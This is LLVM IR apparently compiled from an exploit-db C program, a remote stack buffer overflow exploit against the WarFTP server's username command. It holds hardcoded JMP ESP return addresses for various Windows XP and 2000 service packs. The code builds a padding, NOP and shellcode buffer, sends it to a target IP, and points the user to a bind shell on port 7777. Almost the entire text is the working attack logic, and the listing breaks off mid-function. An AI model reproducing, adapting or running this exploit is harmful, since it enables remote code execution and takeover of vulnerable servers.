; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_3570.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_3570.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@BUFFREAD = common dso_local global i32 0, align 4
@LENJMPESP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [61 x i8] c"\0A\09WarFTP Username Stack-Based Buffer-Overflow Vulnerability\0A\00", align 1
@.str.2 = private unnamed_addr constant [76 x i8] c"     ____________________________________________________________________\0A\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@PORT = common dso_local global i32 0, align 4
@ZERO = common dso_local global i8 0, align 1
@VULNSERVER = common dso_local global i32 0, align 4
@VULNCMD = common dso_local global i8* null, align 8
@VULNBUFF = common dso_local global i32 0, align 4
@syscode = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [5 x i8] c"\E39\F4w\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"\0F\98\F8w\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"\ED\1E\95|\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"\CCY\FAw\00", align 1
@.str.7 = private unnamed_addr constant [5 x i8] c"\FF\FF\FF\FF\00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\8B\94\F8w\00", align 1
@.str.9 = private unnamed_addr constant [5 x i8] c"\ABg\F9w\00", align 1
@.str.10 = private unnamed_addr constant [3 x i8] c"0x\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [72 x i8] c"\09[ ERROR ] Three parameter syntax error\0A\09[ ERROR ] Example: 0xFFFFFFFF\0A\00", align 1
@NOP = common dso_local global i8 0, align 1
@.str.12 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.13 = private unnamed_addr constant [38 x i8] c"\09[ OK ] Exploit buffer send to %s:%d\0A\00", align 1
@.str.14 = private unnamed_addr constant [106 x i8] c"\09[ OK ] If you have not chosen a correct operating system and\0A\09       service pack you can cause a D.O.S\0A\00", align 1
@.str.15 = private unnamed_addr constant [33 x i8] c"\09[ OK ] Connect: telnet %s 7777\0A\00", align 1
@.str.16 = private unnamed_addr constant [42 x i8] c"\09[ ERROR ] No sending all exploit buffer\0A\00", align 1
@.str.17 = private unnamed_addr constant [31 x i8] c"\09[ ERROR ] No allocate memory\0A\00", align 1
@.str.18 = private unnamed_addr constant [36 x i8] c"\09[ ERROR ] Not a vulnerable server\0A\00", align 1
@.str.19 = private unnamed_addr constant [29 x i8] c"\09[ ERROR ] Connect to %s:%d\0A\00", align 1
@.str.20 = private unnamed_addr constant [32 x i8] c"\09[ ERROR ] Create local socket\0A\00", align 1
@.str.21 = private unnamed_addr constant [24 x i8] c"\09[ ERROR ] Load library\00", align 1
@.str.22 = private unnamed_addr constant [59 x i8] c"   [ + ] USE: %s IP_ADDRESS SERVICE_PACK [ ESP_ADDRESS ]\0A\0A\00", align 1
@.str.23 = private unnamed_addr constant [72 x i8] c"   [ + ] SERVICE PACK:  [ - ] Microsoft Windows XP Pro Spanish SP0 (0)\0A\00", align 1
@.str.24 = private unnamed_addr constant [51 x i8] c"\09\09\09[ - ] Microsoft Windows XP Pro Spanish SP1 (1)\0A\00", align 1
@.str.25 = private unnamed_addr constant [51 x i8] c"\09\09\09[ - ] Microsoft Windows XP Pro Spanish SP2 (2)\0A\00", align 1
@.str.26 = private unnamed_addr constant [51 x i8] c"\09\09\09[ - ] Microsoft Windows XP Pro English SP0 (3)\0A\00", align 1
@.str.27 = private unnamed_addr constant [51 x i8] c"\09\09\09[ - ] Microsoft Windows XP Pro English SP1 (4)\0A\00", align 1
@.str.28 = private unnamed_addr constant [51 x i8] c"\09\09\09[ - ] Microsoft Windows XP Pro English SP2 (5)\0A\00", align 1
@.str.29 = private unnamed_addr constant [53 x i8] c"\09\09\09[ - ] Microsoft Windows 2000 Pro Spanish SP0 (6)\0A\00", align 1
@.str.30 = private unnamed_addr constant [53 x i8] c"\09\09\09[ - ] Microsoft Windows 2000 Pro Spanish SP1 (7)\0A\00", align 1
@.str.31 = private unnamed_addr constant [53 x i8] c"\09\09\09[ - ] Microsoft Windows 2000 Pro Spanish SP2 (8)\0A\00", align 1
@.str.32 = private unnamed_addr constant [53 x i8] c"\09\09\09[ - ] Microsoft Windows 2000 Pro Spanish SP3 (9)\0A\00", align 1
@.str.33 = private unnamed_addr constant [54 x i8] c"\09\09\09[ - ] Microsoft Windows 2000 Pro English SP0 (10)\0A\00", align 1
@.str.34 = private unnamed_addr constant [54 x i8] c"\09\09\09[ - ] Microsoft Windows 2000 Pro English SP1 (11)\0A\00", align 1
@.str.35 = private unnamed_addr constant [54 x i8] c"\09\09\09[ - ] Microsoft Windows 2000 Pro English SP2 (12)\0A\00", align 1
@.str.36 = private unnamed_addr constant [54 x i8] c"\09\09\09[ - ] Microsoft Windows 2000 Pro English SP3 (13)\0A\00", align 1
@.str.37 = private unnamed_addr constant [48 x i8] c"\09\09\09[ - ] Custom Service Pack - JMP %%ESP (14)\0A\0A\00", align 1
@.str.38 = private unnamed_addr constant [35 x i8] c"   [ + ] EXAMPLE:  %s 127.0.0.1 2\0A\00", align 1
@.str.39 = private unnamed_addr constant [47 x i8] c"   [ + ] EXAMPLE2: %s 127.0.0.1 14 0x776EDDFF\0A\00", align 1
@.str.40 = private unnamed_addr constant [75 x i8] c"     ___________________________________________________________________\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %19 = load i32, i32* @BUFFREAD, align 4
  %20 = zext i32 %19 to i64
  %21 = call i8* @llvm.stacksave()
  store i8* %21, i8** %6, align 8
  %22 = alloca i8, i64 %20, align 16
  store i64 %20, i64* %7, align 8
  %23 = load i32, i32* @LENJMPESP, align 4
  %24 = zext i32 %23 to i64
  %25 = alloca i8, i64 %24, align 16
  store i64 %24, i64* %8, align 8
  store i32 0, i32* %12, align 4
  %26 = call i32 @system(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  %27 = load i32, i32* @stdout, align 4
  %28 = call i32 (i32, i8*, ...) @fprintf(i32 %27, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.1, i64 0, i64 0))
  %29 = load i32, i32* @stdout, align 4
  %30 = call i32 (i32, i8*, ...) @fprintf(i32 %29, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.2, i64 0, i64 0))
  %31 = load i32, i32* %4, align 4
  %32 = icmp eq i32 %31, 3
  br i1 %32, label %33, label %45

33:                                               ; preds = %2
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 2
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 @atoi(i8* %36)
  %38 = icmp sge i32 %37, 0
  br i1 %38, label %39, label %45

39:                                               ; preds = %33
  %40 = load i8**, i8*** %5, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 2
  %42 = load i8*, i8** %41, align 8
  %43 = call i32 @atoi(i8* %42)
  %44 = icmp slt i32 %43, 14
  br i1 %44, label %54, label %45

45:                                               ; preds = %39, %33, %2
  %46 = load i32, i32* %4, align 4
  %47 = icmp eq i32 %46, 4
  br i1 %47, label %48, label %432

48:                                               ; preds = %45
  %49 = load i8**, i8*** %5, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 2
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @atoi(i8* %51)
  %53 = icmp eq i32 %52, 14
  br i1 %53, label %54, label %432

54:                                               ; preds = %48, %39
  %55 = call i32 @MAKEWORD(i32 2, i32 0)
  %56 = call i64 @WSAStartup(i32 %55, i32* %18)
  %57 = icmp eq i64 %56, 0
  br i1 %57, label %58, label %428

58:                                               ; preds = %54
  %59 = load i32, i32* @AF_INET, align 4
  %60 = load i32, i32* @SOCK_STREAM, align 4
  %61 = call i32 @socket(i32 %59, i32 %60, i32 0)
  store i32 %61, i32* %15, align 4
  %62 = icmp ne i32 %61, -1
  br i1 %62, label %63, label %423

63:                                               ; preds = %58
  %64 = load i32, i32* @AF_INET, align 4
  %65 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  store i32 %64, i32* %65, align 4
  %66 = load i8**, i8*** %5, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 1
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @inet_addr(i8* %68)
  %70 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %71 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %70, i32 0, i32 0
  store i32 %69, i32* %71, align 4
  %72 = load i32, i32* @PORT, align 4
  %73 = call i32 @htons(i32 %72)
  %74 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i32 %73, i32* %74, align 4
  %75 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  %76 = call i32 @memset(i32* %75, i32 48, i32 8)
  %77 = load i32, i32* %15, align 4
  %78 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %79 = call i32 @connect(i32 %77, %struct.sockaddr* %78, i32 4)
  %80 = icmp ne i32 %79, -1
  br i1 %80, label %81, label %413

81:                                               ; preds = %63
  %82 = load i32, i32* %15, align 4
  %83 = load i32, i32* @BUFFREAD, align 4
  %84 = call i32 @recv(i32 %82, i8* %22, i32 %83, i32 0)
  %85 = load i8, i8* @ZERO, align 1
  %86 = load i32, i32* @BUFFREAD, align 4
  %87 = sub nsw i32 %86, 1
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %22, i64 %88
  store i8 %85, i8* %89, align 1
  %90 = load i32, i32* @VULNSERVER, align 4
  %91 = call i32* @strstr(i8* %22, i32 %90)
  %92 = icmp ne i32* %91, null
  br i1 %92, label %93, label %409

93:                                               ; preds = %81
  %94 = load i8*, i8** @VULNCMD, align 8
  %95 = call i32 @strlen(i8* %94)
  %96 = load i32, i32* @VULNBUFF, align 4
  %97 = add nsw i32 %95, %96
  %98 = load i32, i32* @LENJMPESP, align 4
  %99 = add nsw i32 %97, %98
  %100 = sext i32 %99 to i64
  %101 = add i64 %100, 4
  %102 = load i8*, i8** @syscode, align 8
  %103 = call i32 @strlen(i8* %102)
  %104 = sext i32 %103 to i64
  %105 = add i64 %101, %104
  %106 = add i64 %105, 2
  %107 = trunc i64 %106 to i32
  %108 = call i64 @malloc(i32 %107)
  %109 = inttoptr i64 %108 to i8*
  store i8* %109, i8** %11, align 8
  %110 = load i8*, i8** %11, align 8
  %111 = icmp ne i8* %110, null
  br i1 %111, label %112, label %405

112:                                              ; preds = %93
  store i32 0, i32* %13, align 4
  br label %113

113:                                              ; preds = %128, %112
  %114 = load i32, i32* %13, align 4
  %115 = load i8*, i8** @VULNCMD, align 8
  %116 = call i32 @strlen(i8* %115)
  %117 = icmp ult i32 %114, %116
  br i1 %117, label %118, label %131

118:                                              ; preds = %113
  %119 = load i8*, i8** @VULNCMD, align 8
  %120 = load i32, i32* %13, align 4
  %121 = zext i32 %120 to i64
  %122 = getelementptr inbounds i8, i8* %119, i64 %121
  %123 = load i8, i8* %122, align 1
  %124 = load i8*, i8** %11, align 8
  %125 = load i32, i32* %13, align 4
  %126 = zext i32 %125 to i64
  %127 = getelementptr inbounds i8, i8* %124, i64 %126
  store i8 %123, i8* %127, align 1
  br label %128

128:                                              ; preds = %118
  %129 = load i32, i32* %13, align 4
  %130 = add i32 %129, 1
  store i32 %130, i32* %13, align 4
  br label %113

131:                                              ; preds = %113
  store i32 0, i32* %16, align 4
  br label %132

132:                                              ; preds = %141, %131
  %133 = load i32, i32* %16, align 4
  %134 = load i32, i32* @VULNBUFF, align 4
  %135 = icmp slt i32 %133, %134
  br i1 %135, label %136, label %146

136:                                              ; preds = %132
  %137 = load i8*, i8** %11, align 8
  %138 = load i32, i32* %13, align 4
  %139 = zext i32 %138 to i64
  %140 = getelementptr inbounds i8, i8* %137, i64 %139
  store i8 65, i8* %140, align 1
  br label %141

141:                                              ; preds = %136
  %142 = load i32, i32* %13, align 4
  %143 = add i32 %142, 1
  store i32 %143, i32* %13, align 4
  %144 = load i32, i32* %16, align 4
  %145 = add nsw i32 %144, 1
  store i32 %145, i32* %16, align 4
  br label %132

146:                                              ; preds = %132
  %147 = load i8**, i8*** %5, align 8
  %148 = getelementptr inbounds i8*, i8** %147, i64 2
  %149 = load i8*, i8** %148, align 8
  %150 = call i32 @atoi(i8* %149)
  switch i32 %150, label %312 [
    i32 0, label %151
    i32 1, label %154
    i32 2, label %157
    i32 3, label %160
    i32 4, label %163
    i32 5, label %166
    i32 6, label %169
    i32 7, label %172
    i32 8, label %175
    i32 9, label %178
    i32 10, label %181
    i32 11, label %184
    i32 12, label %187
    i32 13, label %190
    i32 14, label %193
  ]

151:                                              ; preds = %146
  %152 = load i32, i32* @LENJMPESP, align 4
  %153 = call i32 @memcpy(i8* %25, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0), i32 %152)
  br label %312

154:                                              ; preds = %146
  %155 = load i32, i32* @LENJMPESP, align 4
  %156 = call i32 @memcpy(i8* %25, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0), i32 %155)
  br label %312

157:                                              ; preds = %146
  %158 = load i32, i32* @LENJMPESP, align 4
  %159 = call i32 @memcpy(i8* %25, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0), i32 %158)
  br label %312

160:                                              ; preds = %146
  %161 = load i32, i32* @LENJMPESP, align 4
  %162 = call i32 @memcpy(i8* %25, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0), i32 %161)
  br label %312

163:                                              ; preds = %146
  %164 = load i32, i32* @LENJMPESP, align 4
  %165 = call i32 @memcpy(i8* %25, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i32 %164)
  br label %312

166:                                              ; preds = %146
  %167 = load i32, i32* @LENJMPESP, align 4
  %168 = call i32 @memcpy(i8* %25, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0), i32 %167)
  br label %312

169:                                              ; preds = %146
  %170 = load i32, i32* @LENJMPESP, align 4
  %171 = call i32 @memcpy(i8* %25, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0), i32 %170)
  br label %312

172:                                              ; preds = %146
  %173 = load i32, i32* @LENJMPESP, align 4
  %174 = call i32 @memcpy(i8* %25, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0), i32 %173)
  br label %312

175:                                              ; preds = %146
  %176 = load i32, i32* @LENJMPESP, align 4
  %177 = call i32 @memcpy(i8* %25, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0), i32 %176)
  br label %312

178:                                              ; preds = %146
  %179 = load i32, i32* @LENJMPESP, align 4
  %180 = call i32 @memcpy(i8* %25, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0), i32 %179)
  br label %312

181:                                              ; preds = %146
  %182 = load i32, i32* @LENJMPESP, align 4
  %183 = call i32 @memcpy(i8* %25, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 %182)
  br label %312

184:                                              ; preds = %146
  %185 = load i32, i32* @LENJMPESP, align 4
  %186 = call i32 @memcpy(i8* %25, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i64 0, i64 0), i32 %185)
  br label %312

187:                                              ; preds = %146
  %188 = load i32, i32* @LENJMPESP, align 4
  %189 = call i32 @memcpy(i8* %25, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0), i32 %188)
  br label %312

190:                                              ; preds = %146
  %191 = load i32, i32* @LENJMPESP, align 4
  %192 = call i32 @memcpy(i8* %25, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0), i32 %191)
  br label %312

193:                                              ; preds = %146
  store i32 0, i32* %14, align 4
  %194 = load i8**, i8*** %5, align 8
  %195 = getelementptr inbounds i8*, i8** %194, i64 3
  %196 = load i8*, i8** %195, align 8
  %197 = call i32 @strncmp(i8* %196, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i64 0, i64 0), i32 2)
  %198 = icmp eq i32 %197, 0
  br i1 %198, label %199, label %308

199:                                              ; preds = %193
  %200 = load i8**, i8*** %5, align 8
  %201 = getelementptr inbounds i8*, i8** %200, i64 3
  %202 = load i8*, i8** %201, align 8
  %203 = call i32 @strlen(i8* %202)
  %204 = icmp eq i32 %203, 10
  br i1 %204, label %205, label %308

205:                                              ; preds = %199
  store i32 7, i32* %16, align 4
  br label %206

206:                                              ; preds = %304, %205
  %207 = load i32, i32* %16, align 4
  %208 = icmp sge i32 %207, 0
  br i1 %208, label %209, label %213

209:                                              ; preds = %206
  %210 = load i32, i32* %12, align 4
  %211 = icmp ne i32 %210, 0
  %212 = xor i1 %211, true
  br label %213

213:                                              ; preds = %209, %206
  %214 = phi i1 [ false, %206 ], [ %212, %209 ]
  br i1 %214, label %215, label %307

215:                                              ; preds = %213
  %216 = load i8**, i8*** %5, align 8
  %217 = getelementptr inbounds i8*, i8** %216, i64 3
  %218 = load i8*, i8** %217, align 8
  %219 = load i32, i32* %16, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds i8, i8* %218, i64 %220
  %222 = getelementptr inbounds i8, i8* %221, i64 2
  %223 = load i8, i8* %222, align 1
  store i8 %223, i8* %9, align 1
  %224 = load i8, i8* %9, align 1
  %225 = sext i8 %224 to i32
  %226 = icmp sgt i32 %225, 47
  br i1 %226, label %227, label %231

227:                                              ; preds = %215
  %228 = load i8, i8* %9, align 1
  %229 = sext i8 %228 to i32
  %230 = icmp slt i32 %229, 58
  br i1 %230, label %247, label %231

231:                                              ; preds = %227, %215
  %232 = load i8, i8* %9, align 1
  %233 = sext i8 %232 to i32
  %234 = icmp sgt i32 %233, 64
  br i1 %234, label %235, label %239

235:                                              ; preds = %231
  %236 = load i8, i8* %9, align 1
  %237 = sext i8 %236 to i32
  %238 = icmp slt i32 %237, 71
  br i1 %238, label %247, label %239

239:                                              ; preds = %235, %231
  %240 = load i8, i8* %9, align 1
  %241 = sext i8 %240 to i32
  %242 = icmp sgt i32 %241, 96
  br i1 %242, label %243, label %300

243:                                              ; preds = %239
  %244 = load i8, i8* %9, align 1
  %245 = sext i8 %244 to i32
  %246 = icmp slt i32 %245, 103
  br i1 %246, label %247, label %300

247:                                              ; preds = %243, %235, %227
  %248 = load i8, i8* %9, align 1
  %249 = sext i8 %248 to i32
  %250 = icmp sgt i32 %249, 47
  br i1 %250, label %251, label %260

251:                                              ; preds = %247
  %252 = load i8, i8* %9, align 1
  %253 = sext i8 %252 to i32
  %254 = icmp slt i32 %253, 58
  br i1 %254, label %255, label %260

255:                                              ; preds = %251
  %256 = load i8, i8* %9, align 1
  %257 = sext i8 %256 to i32
  %258 = sub nsw i32 %257, 48
  %259 = trunc i32 %258 to i8
  store i8 %259, i8* %9, align 1
  br label %279

260:                                              ; preds = %251, %247
  %261 = load i8, i8* %9, align 1
  %262 = sext i8 %261 to i32
  %263 = icmp sgt i32 %262, 64
  br i1 %263, label %264, label %273

264:                                              ; preds = %260
  %265 = load i8, i8* %9, align 1
  %266 = sext i8 %265 to i32
  %267 = icmp slt i32 %266, 71
  br i1 %267, label %268, label %273

268:                                              ; preds = %264
  %269 = load i8, i8* %9, align 1
  %270 = sext i8 %269 to i32
  %271 = sub nsw i32 %270, 55
  %272 = trunc i32 %271 to i8
  store i8 %272, i8* %9, align 1
  br label %278

273:                                              ; preds = %264, %260
  %274 = load i8, i8* %9, align 1
  %275 = sext i8 %274 to i32
  %276 = sub nsw i32 %275, 87
  %277 = trunc i32 %276 to i8
  store i8 %277, i8* %9, align 1
  br label %278

278:                                              ; preds = %273, %268
  br label %279

279:                                              ; preds = %278, %255
  %280 = load i32, i32* %16, align 4
  %281 = srem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  br i1 %282, label %283, label %297

283:                                              ; preds = %279
  %284 = load i8, i8* %9, align 1
  %285 = sext i8 %284 to i32
  %286 = shl i32 %285, 4
  %287 = trunc i32 %286 to i8
  store i8 %287, i8* %9, align 1
  %288 = sext i8 %287 to i32
  %289 = load i8, i8* %10, align 1
  %290 = sext i8 %289 to i32
  %291 = or i32 %288, %290
  %292 = trunc i32 %291 to i8
  %293 = load i32, i32* %14, align 4
  %294 = add i32 %293, 1
  store i32 %294, i32* %14, align 4
  %295 = zext i32 %293 to i64
  %296 = getelementptr inbounds i8, i8* %25, i64 %295
  store i8 %292, i8* %296, align 1
  br label %299

297:                                              ; preds = %279
  %298 = load i8, i8* %9, align 1
  store i8 %298, i8* %10, align 1
  br label %299

299:                                              ; preds = %297, %283
  br label %303

300:                                              ; preds = %243, %239
  %301 = load i32, i32* @stderr, align 4
  %302 = call i32 (i32, i8*, ...) @fprintf(i32 %301, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.11, i64 0, i64 0))
  store i32 1, i32* %12, align 4
  br label %303

303:                                              ; preds = %300, %299
  br label %304

304:                                              ; preds = %303
  %305 = load i32, i32* %16, align 4
  %306 = add nsw i32 %305, -1
  store i32 %306, i32* %16, align 4
  br label %206

307:                                              ; preds = %213
  br label %311

308:                                              ; preds = %199, %193
  %309 = load i32, i32* @stderr, align 4
  %310 = call i32 (i32, i8*, ...) @fprintf(i32 %309, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.11, i64 0, i64 0))
  store i32 1, i32* %12, align 4
  br label %311

311:                                              ; preds = %308, %307
  br label %312

312:                                              ; preds = %311, %146, %190, %187, %184, %181, %178, %175, %172, %169, %166, %163, %160, %157, %154, %151
  %313 = load i32, i32* %12, align 4
  %314 = icmp ne i32 %313, 0
  br i1 %314, label %402, label %315

315:                                              ; preds = %312
  store i32 0, i32* %16, align 4
  br label %316

316:                                              ; preds = %329, %315
  %317 = load i32, i32* %16, align 4
  %318 = load i32, i32* @LENJMPESP, align 4
  %319 = icmp slt i32 %317, %318
  br i1 %319, label %320, label %334

320:                                              ; preds = %316
  %321 = load i32, i32* %16, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds i8, i8* %25, i64 %322
  %324 = load i8, i8* %323, align 1
  %325 = load i8*, i8** %11, align 8
  %326 = load i32, i32* %13, align 4
  %327 = zext i32 %326 to i64
  %328 = getelementptr inbounds i8, i8* %325, i64 %327
  store i8 %324, i8* %328, align 1
  br label %329

329:                                              ; preds = %320
  %330 = load i32, i32* %13, align 4
  %331 = add i32 %330, 1
  store i32 %331, i32* %13, align 4
  %332 = load i32, i32* %16, align 4
  %333 = add nsw i32 %332, 1
  store i32 %333, i32* %16, align 4
  br label %316

334:                                              ; preds = %316
  store i32 0, i32* %16, align 4
  br label %335

335:                                              ; preds = %345, %334
  %336 = load i32, i32* %16, align 4
  %337 = sext i32 %336 to i64
  %338 = icmp ult i64 %337, 4
  br i1 %338, label %339, label %350

339:                                              ; preds = %335
  %340 = load i8, i8* @NOP, align 1
  %341 = load i8*, i8** %11, align 8
  %342 = load i32, i32* %13, align 4
  %343 = zext i32 %342 to i64
  %344 = getelementptr inbounds i8, i8* %341, i64 %343
  store i8 %340, i8* %344, align 1
  br label %345

345:                                              ; preds = %339
  %346 = load i32, i32* %13, align 4
  %347 = add i32 %346, 1
  store i32 %347, i32* %13, align 4
  %348 = load i32, i32* %16, align 4
  %349 = add nsw i32 %348, 1
  store i32 %349, i32* %16, align 4
  br label %335

350:                                              ; preds = %335
  store i32 0, i32* %16, align 4
  br label %351

351:                                              ; preds = %366, %350
  %352 = load i32, i32* %16, align 4
  %353 = load i8*, i8** @syscode, align 8
  %354 = call i32 @strlen(i8* %353)
  %355 = icmp slt i32 %352, %354
  br i1 %355, label %356, label %371

356:                                              ; preds = %351
  %357 = load i8*, i8** @syscode, align 8
  %358 = load i32, i32* %16, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds i8, i8* %357, i64 %359
  %361 = load i8, i8* %360, align 1
  %362 = load i8*, i8** %11, align 8
  %363 = load i32, i32* %13, align 4
  %364 = zext i32 %363 to i64
  %365 = getelementptr inbounds i8, i8* %362, i64 %364
  store i8 %361, i8* %365, align 1
  br label %366

366:                                              ; preds = %356
  %367 = load i32, i32* %13, align 4
  %368 = add i32 %367, 1
  store i32 %368, i32* %13, align 4
  %369 = load i32, i32* %16, align 4
  %370 = add nsw i32 %369, 1
  store i32 %370, i32* %16, align 4
  br label %351

371:                                              ; preds = %351
  %372 = load i8*, i8** %11, align 8
  %373 = load i32, i32* %13, align 4
  %374 = zext i32 %373 to i64
  %375 = getelementptr inbounds i8, i8* %372, i64 %374
  %376 = call i32 @memcpy(i8* %375, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.12, i64 0, i64 0), i32 2)
  %377 = load i32, i32* %13, align 4
  %378 = load i32, i32* %15, align 4
  %379 = load i8*, i8** %11, align 8
  %380 = load i32, i32* %13, align 4
  %381 = add i32 %380, 1
  store i32 %381, i32* %13, align 4
  %382 = call i32 @send(i32 %378, i8* %379, i32 %381, i32 0)
  %383 = icmp eq i32 %377, %382
  br i1 %383, label %384, label %398

384:                                              ; preds = %371
  %385 = load i32, i32* @stdout, align 4
  %386 = load i8**, i8*** %5, align 8
  %387 = getelementptr inbounds i8*, i8** %386, i64 1
  %388 = load i8*, i8** %387, align 8
  %389 = load i32, i32* @PORT, align 4
  %390 = call i32 (i32, i8*, ...) @fprintf(i32 %385, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.13, i64 0, i64 0), i8* %388, i32 %389)
  %391 = load i32, i32* @stdout, align 4
  %392 = call i32 (i32, i8*, ...) @fprintf(i32 %391, i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.14, i64 0, i64 0))
  %393 = load i32, i32* @stdout, align 4
  %394 = load i8**, i8*** %5, align 8
  %395 = getelementptr inbounds i8*, i8** %394, i64 1
  %396 = load i8*, i8** %395, align 8
  %397 = call i32 (i32, i8*, ...) @fprintf(i32 %393, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.15, i64 0, i64 0), i8* %396)
  br label %401

398:                                              ; preds = %371
  %399 = load i32, i32* @stderr, align 4
  %400 = call i32 (i32, i8*, ...) @fprintf(i32 %399, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.16, i64 0, i64 0))
  br label %401

401:                                              ; preds = %398, %384
  br label %402

402:                                              ; preds = %401, %312
  %403 = load i8*, i8** %11, align 8
  %404 = call i32 @free(i8* %403)
  br label %408

405:                                              ; preds = %93
  %406 = load i32, i32* @stderr, align 4
  %407 = call i32 (i32, i8*, ...) @fprintf(i32 %406, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.17, i64 0, i64 0))
  br label %408

408:                                              ; preds = %405, %402
  br label %412

409:                                              ; preds = %81
  %410 = load i32, i32* @stderr, align 4
  %411 = call i32 (i32, i8*, ...) @fprintf(i32 %410, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.18, i64 0, i64 0))
  br label %412

412:                                              ; preds = %409, %408
  br label %420

413:                                              ; preds = %63
  %414 = load i32, i32* @stderr, align 4
  %415 = load i8**, i8*** %5, align 8
  %416 = getelementptr inbounds i8*, i8** %415, i64 1
  %417 = load i8*, i8** %416, align 8
  %418 = load i32, i32* @PORT, align 4
  %419 = call i32 (i32, i8*, ...) @fprintf(i32 %414, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.19, i64 0, i64 0), i8* %417, i32 %418)
  br label %420

420:                                              ; preds = %413, %412
  %421 = load i32, i32* %15, align 4
  %422 = call i32 @closesocket(i32 %421)
  br label %426

423:                                              ; preds = %58
  %424 = load i32, i32* @stderr, align 4
  %425 = call i32 (i32, i8*, ...) @fprintf(i32 %424, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.20, i64 0, i64 0))
  br label %426

426:                                              ; preds = %423, %420
  %427 = call i32 (...) @WSACleanup()
  br label %431

428:                                              ; preds = %54
  %429 = load i32, i32* @stderr, align 4
  %430 = call i32 (i32, i8*, ...) @fprintf(i32 %429, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.21, i64 0, i64 0))
  br label %431

431:                                              ; preds = %428, %426
  br label %478

432:                                              ; preds = %48, %45
  %433 = load i32, i32* @stderr, align 4
  %434 = load i8**, i8*** %5, align 8
